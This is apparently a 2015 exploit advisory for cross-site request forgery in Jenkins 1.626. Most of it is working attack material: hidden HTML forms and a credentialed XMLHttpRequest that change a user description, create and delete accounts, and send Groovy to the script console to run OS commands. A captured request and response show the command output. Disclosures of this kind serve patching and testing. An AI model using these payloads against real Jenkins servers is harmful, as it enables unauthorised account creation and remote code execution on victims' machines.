@@ -1,0 +1,162 @@
+# Title: Jenkins 1.626 - Cross Site Request Forgery / Code Execution
+# Date: 27.08.15
+# Vendor: jenkins-ci.org
+# Affected versions: => 1.626 (current)
+# Software link: http://mirrors.jenkins-ci.org/war/latest/jenkins.war
+# Tested on: win64
+# Author: Smash_
+# Contact: smash [at] devilteam.pl
+ 
+Cross site request forgery vulnerability in Jenkins 1.626 allows remote attackers to hjiack the authentication of users for most request. Using CSRF it is able to change specific settings or even execute code on os as shown below.
+ 
+Examples:
+ 
+<html>
+  <!-- Change user descripton -->
+  <body>
+    <form action="http://127.0.0.1/jenkins/user/user/submitDescription" method="POST">
+      <input type="hidden" name="description" value="abc" />
+      <input type="hidden" name="json" value="&#123;"description"&#58;&#32;"abc"&#125;" />
+      <input type="hidden" name="Submit" value="Submit" />
+      <input type="submit" value="Go" />
+    </form>
+  </body>
+</html>
+ 
+<!-- // -->
+ 
+<html>
+  <!-- Add user -->
+  <body>
+    <form action="http://127.0.0.1/jenkins/securityRealm/createAccountByAdmin" method="POST">
+      <input type="hidden" name="username" value="csrf" />
+      <input type="hidden" name="password1" value="pass" />
+      <input type="hidden" name="password2" value="pass" />
+      <input type="hidden" name="fullname" value="Legit&#32;Bob" />
+      <input type="hidden" name="email" value="bob&#64;mail&#46;box" />
+      <input type="hidden" name="json" value="&#123;"username"&#58;&#32;"csrf"&#44;&#32;"password1"&#58;&#32;"pass"&#44;&#32;"password2"&#58;&#32;"pass"&#44;&#32;"fullname"&#58;&#32;"Legit&#32;Bob"&#44;&#32;"email"&#58;&#32;"bob&#64;mail&#46;box"&#125;" />
+      <input type="hidden" name="Submit" value="Sign&#32;up" />
+      <input type="submit" value="Go" />
+    </form>
+  </body>
+</html>
+ 
+<!-- // -->
+ 
+<html>
+  <!-- Delete user -->
+  <body>
+    <form action="http://127.0.0.1/jenkins/user/csrf/doDelete" method="POST">
+      <input type="hidden" name="json" value="&#123;&#125;" />
+      <input type="hidden" name="Submit" value="Yes" />
+      <input type="submit" value="Go" />
+    </form>
+  </body>
+</html>
+ 
+<!-- // -->
+ 
+<html>
+  <!-- Code execution #1
+          groovy: print "cmd /c dir".execute().text
+            -->
+  <body>
+    <form action="http://127.0.0.1/jenkins/script" method="POST">
+      <input type="hidden" name="script" value="print&#32;"cmd&#32;&#47;c&#32;dir"&#46;execute&#40;&#41;&#46;text&#13;&#10;" />
+      <input type="hidden" name="json" value="&#123;"script"&#58;&#32;"print&#32;&#92;"cmd&#32;&#47;c&#32;dir&#92;"&#46;execute&#40;&#41;&#46;text&#92;n"&#44;&#32;""&#58;&#32;""&#125;" />
+      <input type="hidden" name="Submit" value="Wykonaj" />
+      <input type="submit" value="Go" />
+    </form>
+  </body>
+</html>
+ 
+<html>
+  <!-- Code execution #2
+          groovy: print "cmd /c dir".execute().text
+            -->
+  <body>
+    <script>
+        var xhr = new XMLHttpRequest();
+        xhr.open("POST", "http://127.0.0.1/jenkins/computer/(master)/script", true);
+        xhr.setRequestHeader("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8");
+        xhr.setRequestHeader("Accept-Language", "pl,en-US;q=0.7,en;q=0.3");
+        xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
+        xhr.withCredentials = true;
+        var body = "script=println+%22cmd+%2Fc+dir%22.execute%28%29.text&json=%7B%22script%22%3A+%22println+%5C%22cmd+%2Fc+dir%5C%22.execute%28%29.text%22%2C+%22%22%3A+%22%22%7D&Submit=Wykonaj";
+        var aBody = new Uint8Array(body.length);
+        for (var i = 0; i < aBody.length; i++)
+          aBody[i] = body.charCodeAt(i);
+        xhr.send(new Blob([aBody]));
+  </body>
+</html>
+ 
+ 
+Request:
+POST /jenkins/script HTTP/1.1
+Host: 127.0.0.1
+User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: pl,en-US;q=0.7,en;q=0.3
+Accept-Encoding: gzip, deflate
+Referer: http://127.0.0.1/jenkins/script
+Cookie: JSESSIONID=E8F948238B2F4D6DAFAF191F074E6C3E; screenResolution=1600x900
+Connection: keep-alive
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 178
+ 
+script=print+%22cmd+%2Fc+dir%22.execute%28%29.text%0D%0A&json=%7B%22script%22%3A+%22print+%5C%22cmd+%2Fc+dir%5C%22.execute%28%29.text%5Cn%22%2C+%22%22%3A+%22%22%7D&Submit=Wykonaj
+ 
+Response:
+HTTP/1.1 200 OK
+Date: Thu, 27 Aug 2015 18:06:55 GMT
+Server: Apache
+X-Frame-Options: SAMEORIGIN
+X-Content-Type-Options: nosniff
+Expires: 0
+Cache-Control: no-cache,no-store,must-revalidate
+X-Hudson-Theme: default
+X-Hudson: 1.395
+X-Jenkins: 1.626
+X-Jenkins-Session: 0ff3a92b
+X-Hudson-CLI-Port: 1834
+X-Jenkins-CLI-Port: 1834
+X-Jenkins-CLI2-Port: 1834
+X-Frame-Options: sameorigin
+X-Instance-Identity: MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAoMa5pk8H/b/c/jIOBH+D8XGi2/1MUshSuGtK41S9ON67SRR1Dzmqlzhj+Hsgla6+NJDCFKqZf3aoQbgt8nVzQRkb12bjYPHMupa58SApxwIyvhRJaNq9jq+CcllEwt9m+N1JeCxeLork82LAbiDSBbPhHBGLzqA0a9hzKVTm80i9yiTqDoEK+WyK4m8AyqJFH/V4lkERKbSr2YK1u2sFGCuBaGAK/RYspmNmJSqj0c3lPEYeDsehTSn4PHpFrbsvKkHKD1RxNDRciSFMNY3RtxpBEhKxvJHkpy9HKF+ktYebwCMZ4J8LKnhkvwqJPgpqar3FuxX4Gsfwoy0/1oCtPQIDAQAB
+X-SSH-Endpoint: 127.0.0.1:1832
+Content-Type: text/html;charset=UTF-8
+Content-Length: 13468
+Keep-Alive: timeout=5, max=100
+Connection: Keep-Alive
+(...)
+><link rel='stylesheet' href='/jenkins/adjuncts/0ff3a92b/org/kohsuke/stapler/codemirror/theme/default.css' type='text/css' /><h2>Rezultat</h2><pre> Wolumin w stacji C to Windows7_OS
+ Numer seryjny woluminu: D2DC-59F9
+ 
+ Katalog: C:\Bitnami\jenkins-1.626-0
+ 
+2015-08-27  18:51    <DIR>          .
+2015-08-27  18:51    <DIR>          ..
+2015-08-27  18:47    <DIR>          apache-tomcat
+2015-08-27  18:47    <DIR>          apache2
+2015-08-27  18:47    <DIR>          apps
+2015-08-27  18:49             9�751 changelog.txt
+2015-08-27  18:47    <DIR>          common
+2015-08-27  18:48    <DIR>          git
+2015-08-27  18:49    <DIR>          gradle
+2015-08-27  18:47    <DIR>          img
+2015-08-27  18:47    <DIR>          java
+2015-08-27  18:47    <DIR>          licenses
+2015-07-30  14:15         3�080�056 manager-windows.exe
+2015-08-27  18:50             1�102 properties.ini
+2015-08-27  18:49            12�118 README.txt
+2015-08-27  18:50    <DIR>          scripts
+2015-08-27  18:47             5�536 serviceinstall.bat
+2015-08-27  18:47             5�724 servicerun.bat
+2015-08-27  18:47    <DIR>          sqlite
+2015-08-27  18:51           268�031 uninstall.dat
+2015-08-27  18:51         7�038�369 uninstall.exe
+2015-08-27  18:50               166 use_jenkins.bat
+               9 plik(�w)         10�420�853 bajt�w
+              13 katalog(�w)  110�690�426�880 bajt�w wolnych
+</pre></div>
+(...)
